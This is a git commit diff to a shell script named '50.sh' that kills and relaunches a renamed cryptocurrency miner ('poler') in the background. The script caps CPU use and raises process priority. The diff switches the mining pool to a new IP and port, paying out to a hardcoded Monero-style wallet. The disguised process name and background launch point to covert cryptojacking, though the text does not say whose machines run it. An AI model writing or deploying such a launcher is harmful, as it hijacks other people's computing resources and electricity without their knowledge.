4408e13ab1095657bd6702e38d311d7b3ab62f60
robbertopp1 <45674442+robbertopp1@users.noreply.github.com>
2019-06-22 15:51:33 +0000

    Update 50.sh

--- 50.sh
+++ 50.sh
@@ -1,5 +1,5 @@
 pkill poler
 sleep 7
-poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 80 --cpu-priority 3 -o 94.103.94.11:5992 -u 498JGhAsSUrijASh6ixJoEX7pBef9qSfDjhdEaExrS48WtftLHBczDgJHVGiDdEU59ERbk5qAwLQiB38xACSiDFZCkva7xY --pass=sasasa:faker85552@gmail.com
+poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 80 --cpu-priority 5 -o 109.234.36.164:5931 -u 498JGhAsSUrijASh6ixJoEX7pBef9qSfDjhdEaExrS48WtftLHBczDgJHVGiDdEU59ERbk5qAwLQiB38xACSiDFZCkva7xY --pass=sasasa:faker85552@gmail.com
  -k
 
